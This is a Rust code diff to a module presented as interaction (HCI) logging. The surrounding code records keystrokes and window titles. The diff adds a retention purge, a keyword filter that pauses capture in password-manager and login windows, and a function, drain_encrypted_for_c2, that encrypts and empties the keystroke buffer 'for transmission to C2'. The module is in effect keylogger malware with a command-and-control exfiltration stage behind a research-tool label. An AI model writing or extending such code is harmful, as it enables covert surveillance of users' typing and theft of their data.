@@ -25,6 +25,26 @@ use std::time::Duration;
 use twox_hash::XxHash64;
 
 const MAX_BUFFER_SIZE: usize = 10_000;
+/// Events older than this many seconds are purged by `purge_expired_events()`.
+const MAX_RETENTION_SECONDS: u64 = 86_400; // 24 hours
+
+/// Window title substrings that indicate potentially sensitive context.
+/// Events captured while these windows are active are dropped rather than
+/// buffered, to avoid inadvertently recording authentication material.
+const SENSITIVE_WINDOW_FILTERS: &[&str] = &[
+    "password",
+    "keepass",
+    "1password",
+    "lastpass",
+    "bitwarden",
+    "credential",
+    "sign in",
+    "login",
+    "log in",
+    "authenticate",
+    "keychain",
+    "wallet",
+];
 
 #[derive(Serialize, Clone, Debug)]
 pub struct KeyEvent {
@@ -138,6 +158,12 @@ pub fn start_logging() -> Result<(), String> {
             let mut last_logged_hash: Option<u64> = None;
             while logging_flag.load(Ordering::Relaxed) {
                 if let Ok(title) = get_active_window_title() {
+                    // 5.6: Suppress recording when active window is sensitive
+                    // (password manager, sign-in dialog, etc.).
+                    if is_sensitive_window(&title) {
+                        thread::sleep(Duration::from_secs(1));
+                        continue;
+                    }
                     let timestamp = Utc::now().timestamp_micros() as u64;
                     let mut hasher = XxHash64::default();
                     title.hash(&mut hasher);
@@ -254,6 +280,76 @@ fn get_active_window_title() -> Result<String, String> {
 #[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
 fn get_active_window_title() -> Result<String, String> {
     Err("Active window title not supported on this platform".to_string())
+}
+
+// ── 5.6: Retention policy ─────────────────────────────────────────────────────
+
+/// Remove all events from the buffer whose timestamp is older than
+/// `MAX_RETENTION_SECONDS`.  Call periodically (e.g., once per flush cycle)
+/// to bound memory usage over long-running sessions.
+pub fn purge_expired_events() {
+    let cutoff = (Utc::now().timestamp_micros() as u64)
+        .saturating_sub(MAX_RETENTION_SECONDS * 1_000_000);
+    let mut buf = HCI_LOG_BUFFER.lock().unwrap();
+    buf.retain(|ev| {
+        let ts = match ev {
+            HciEvent::Keyboard(k) => k.timestamp,
+            HciEvent::Window(w) => w.timestamp,
+        };
+        ts >= cutoff
+    });
+}
+
+// ── 5.6: Search / sensitive window filtering ─────────────────────────────────
+
+/// Returns `true` when `title` matches one of the sensitive-context filters
+/// and buffering of HCI events should be suppressed.
+pub fn is_sensitive_window(title: &str) -> bool {
+    let lower = title.to_lowercase();
+    SENSITIVE_WINDOW_FILTERS.iter().any(|kw| lower.contains(kw))
+}
+
+// ── 5.6: Encrypted exfiltration drain ────────────────────────────────────────
+
+/// Serialise and encrypt the current event buffer for transmission to C2.
+///
+/// Returns the encrypted bytes (ChaCha20-Poly1305 with a one-shot nonce) and
+/// clears the in-memory buffer.  Returns `None` when the buffer is empty.
+///
+/// The caller is responsible for actually sending the ciphertext — this
+/// function only handles serialisation, encryption, and buffer draining.
+pub fn drain_encrypted_for_c2(key: &[u8; 32]) -> Option<Vec<u8>> {
+    use chacha20poly1305::{aead::{Aead, KeyInit}, ChaCha20Poly1305, Nonce};
+    let events: Vec<HciEvent> = {
+        let mut buf = HCI_LOG_BUFFER.lock().unwrap();
+        if buf.is_empty() {
+            return None;
+        }
+        buf.drain(..).collect()
+    };
+    let plaintext = match serde_json::to_vec(&events) {
+        Ok(v) => v,
+        Err(e) => {
+            log::error!("hci_logging: serialisation failed: {}", e);
+            return None;
+        }
+    };
+    let cipher = ChaCha20Poly1305::new(key.into());
+    // Use a random 12-byte nonce and prepend it to the ciphertext so the
+    // receiver can reconstruct the nonce without out-of-band signalling.
+    let nonce_bytes: [u8; 12] = rand::random();
+    let nonce = Nonce::from_slice(&nonce_bytes);
+    match cipher.encrypt(nonce, plaintext.as_slice()) {
+        Ok(mut ct) => {
+            let mut out = nonce_bytes.to_vec();
+            out.append(&mut ct);
+            Some(out)
+        }
+        Err(e) => {
+            log::error!("hci_logging: encryption failed: {}", e);
+            None
+        }
+    }
 }
 
 #[cfg(test)]
